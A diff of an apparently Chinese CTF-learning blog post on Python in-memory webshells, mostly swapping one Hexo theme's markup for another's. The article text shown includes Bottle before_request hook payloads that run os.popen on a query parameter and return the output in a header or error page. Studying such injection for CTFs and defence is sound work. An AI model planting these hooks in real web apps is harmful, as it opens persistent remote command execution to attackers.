@@ -1,219 +1,165 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="前言：想法来源于TGCTF的一道题 想具体学习下 内存马究竟是什么东西 Python内存马众所周知，python下有许多轻型框架，比如 flask Tornado pyramid等 每个框架都基本有其对应的内存马注入的方式 Flask内存马注入flask框架中使用 render_template_string() 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 pytho">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>浅谈python内存马 | Sauy's corner</title><meta name="author" content="Sauy"><meta name="copyright" content="Sauy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：想法来源于TGCTF的一道题 想具体学习下 内存马究竟是什么东西 Python内存马众所周知，python下有许多轻型框架，比如 flask Tornado pyramid等 每个框架都基本有其对应的内存马注入的方式 Flask内存马注入flask框架中使用 render_template_string() 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 pytho">
 <meta property="og:type" content="article">
 <meta property="og:title" content="浅谈python内存马">
 <meta property="og:url" content="http://example.com/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Sauy&#39;s corner">
 <meta property="og:description" content="前言：想法来源于TGCTF的一道题 想具体学习下 内存马究竟是什么东西 Python内存马众所周知，python下有许多轻型框架，比如 flask Tornado pyramid等 每个框架都基本有其对应的内存马注入的方式 Flask内存马注入flask框架中使用 render_template_string() 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 pytho">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/image-20250417154155980.png">
-<meta property="og:image" content="http://example.com/images/image-20250417163201553.png">
-<meta property="og:image" content="http://example.com/images/image-20250417163250131.png">
-<meta property="og:image" content="http://example.com/images/image-20250417164109472.png">
-<meta property="og:image" content="http://example.com/images/image-20250417172055122.png">
-<meta property="og:image" content="http://example.com/images/image-20250417172224797.png">
-<meta property="og:image" content="http://example.com/images/image-20250418134610602.png">
+<meta property="og:image" content="http://example.com/img/2233.JPG">
 <meta property="article:published_time" content="2025-04-20T14:30:30.000Z">
 <meta property="article:modified_time" content="2025-04-21T01:54:16.631Z">
 <meta property="article:author" content="Sauy">
 <meta property="article:tag" content="CTF学习">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/image-20250417154155980.png">
-
-<link rel="canonical" href="http://example.com/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh-CN'
-  };
-</script>
-
-  <title>浅谈python内存马 | Sauy's corner</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Sauy's corner</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/2.png">
-      <meta itemprop="name" content="Sauy">
-      <meta itemprop="description" content="VENI,VEDI,VICI">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sauy's corner">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          浅谈python内存马
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-04-20 22:30:30" itemprop="dateCreated datePublished" datetime="2025-04-20T22:30:30+08:00">2025-04-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-04-21 09:54:16" itemprop="dateModified" datetime="2025-04-21T09:54:16+08:00">2025-04-21</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+<meta name="twitter:image" content="http://example.com/img/2233.JPG"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "浅谈python内存马",
+  "url": "http://example.com/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/",
+  "image": "http://example.com/img/2233.JPG",
+  "datePublished": "2025-04-20T14:30:30.000Z",
+  "dateModified": "2025-04-21T01:54:16.631Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Sauy",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
       
-        <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>想法来源于TGCTF的一道题 想具体学习下 内存马究竟是什么东西</p>
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '浅谈python内存马',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: rgba(255, 255, 255, 0);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/2233.JPG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/33.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Sauy's corner</span></a><a class="nav-page-title" href="/"><span class="site-name">浅谈python内存马</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">浅谈python内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-20T14:30:30.000Z" title="发表于 2025-04-20 22:30:30">2025-04-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-21T01:54:16.631Z" title="更新于 2025-04-21 09:54:16">2025-04-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>想法来源于TGCTF的一道题 想具体学习下 内存马究竟是什么东西</p>
 <h1 id="Python内存马"><a href="#Python内存马" class="headerlink" title="Python内存马"></a>Python内存马</h1><p>众所周知，python下有许多轻型框架，比如 flask Tornado pyramid等 每个框架都基本有其对应的内存马注入的方式</p>
 <h2 id="Flask内存马注入"><a href="#Flask内存马注入" class="headerlink" title="Flask内存马注入"></a>Flask内存马注入</h2><p>flask框架中使用 <code>render_template_string()</code> 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 python 内存马的注入。</p>
 <h3 id="老版flask内存马注入"><a href="#老版flask内存马注入" class="headerlink" title="老版flask内存马注入"></a>老版flask内存马注入</h3><p>多存在ssti的场景中 如果想要在python中实现内存马 必须想是否能动态注册新路由 </p>
@@ -339,201 +285,4 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#reaponse</span></span><br><span class="line">app.add_hook(<span class="string">&#x27;before_request&#x27;</span>, <span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;bottle&#x27;</span>).response.set_header(<span class="string">&#x27;X-flag&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;base64&#x27;</span>).b64encode(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.query.get(<span class="string">&#x27;a&#x27;</span>)).read().encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#abort</span></span><br><span class="line">app.add_hook(<span class="string">&#x27;before_request&#x27;</span>, <span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;bottle&#x27;</span>).abort(<span class="number">404</span>,<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.query.get(<span class="string">&#x27;a&#x27;</span>)).read()))</span><br></pre></td></tr></table></figure>
 
 <h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>学习python内存马先告一段落了 有很多其他模板的内存马 以后遇到了再来补全吧~~~</p>
-
-    </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/CTF%E5%AD%A6%E4%B9%A0/" rel="tag"># CTF学习</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2025/04/14/TGCTF2025-WEB/" rel="prev" title="TGCTF2025-WEB WP">
-      <i class="fa fa-chevron-left"></i> TGCTF2025-WEB WP
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2025/04/24/HTB-Practice/" rel="next" title="HTB-Code">
-      HTB-Code <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number"></span> <span class="nav-text">Python内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Flask%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">Flask内存马注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%81%E7%89%88flask%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">老版flask内存马注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E4%BB%8E%E4%B8%8B%E9%9D%A2%E4%B8%80%E7%9B%B4%E5%88%B0%E6%9E%84%E9%80%A0webshell-%E9%83%BD%E6%98%AF%E5%89%8D%E8%A8%80%E7%9F%A5%E8%AF%86-%E4%B8%BA%E4%BA%86%E8%AE%A9%E4%BD%A0%E6%9B%B4%E5%A5%BD%E7%90%86%E8%A7%A3-%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84payload"><span class="nav-number">1.1.1.</span> <span class="nav-text">注意：从下面一直到构造webshell 都是前言知识 为了让你更好理解 内存马的payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#add-url-ruel%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.2.</span> <span class="nav-text">add_url_ruel介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.3.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lambada%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">1.1.4.</span> <span class="nav-text">lambada表达式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Flask%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6"><span class="nav-number">1.1.5.</span> <span class="nav-text">Flask上下文管理机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87-request-context"><span class="nav-number">1.1.6.</span> <span class="nav-text">请求上下文 (request context)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E4%B8%8A%E4%B8%8B%E6%96%87-application-context"><span class="nav-number">1.1.7.</span> <span class="nav-text">应用上下文 (application context)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E4%B8%A4%E4%B8%AA%E6%A0%88"><span class="nav-number">1.1.8.</span> <span class="nav-text">核心两个栈</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval%E7%94%A8%E6%B3%95eval-expression-globals-None-locals-None"><span class="nav-number">1.1.9.</span> <span class="nav-text">eval用法eval(expression, globals&#x3D;None, locals&#x3D;None)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%86%99%E6%B3%95"><span class="nav-number">1.1.10.</span> <span class="nav-text">内存马写法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E7%89%88flask%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">新版flask内存马注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#app-before-request"><span class="nav-number">1.2.1.</span> <span class="nav-text">@app.before_request</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#app-after-request"><span class="nav-number">1.2.2.</span> <span class="nav-text">@app.after_request</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pyamid%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.3.</span> <span class="nav-text">Pyamid内存马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%A0%88%E5%B8%A7%E6%89%93Pyramid-WEB%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.4.</span> <span class="nav-text">利用栈帧打Pyramid WEB框架下的内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7"><span class="nav-number">1.4.1.</span> <span class="nav-text">栈帧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.4.2.</span> <span class="nav-text">构造内存马</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bottle%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.5.</span> <span class="nav-text">bottle内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%9B%B4%E6%8E%A5%E7%BB%91%E5%AE%9A%E8%B7%AF%E7%94%B1"><span class="nav-number">1.5.1.</span> <span class="nav-text">1.直接绑定路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E7%95%8C%E9%9D%A2-%E6%B1%A1%E6%9F%93%E6%8A%A5%E9%94%99%E7%95%8C%E9%9D%A2"><span class="nav-number">1.5.2.</span> <span class="nav-text">2.利用报错界面 污染报错界面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8add-hook"><span class="nav-number">1.5.3.</span> <span class="nav-text">3.利用add_hook</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">2.</span> <span class="nav-text">结语</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Sauy"
-      src="/images/2.png">
-  <p class="site-author-name" itemprop="name">Sauy</p>
-  <div class="site-description" itemprop="description">VENI,VEDI,VICI</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">17</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">5</span>
-        <span class="site-state-item-name">标签</span>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://space.bilibili.com/415414982?spm_id_from=333.1387.0.0" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;415414982?spm_id_from&#x3D;333.1387.0.0" rel="noopener" target="_blank"><i class="tv-retro fa-fw"></i>Bilibili</a>
-      </span>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Sauy</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Sauy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">http://example.com/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Sauy's corner</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" 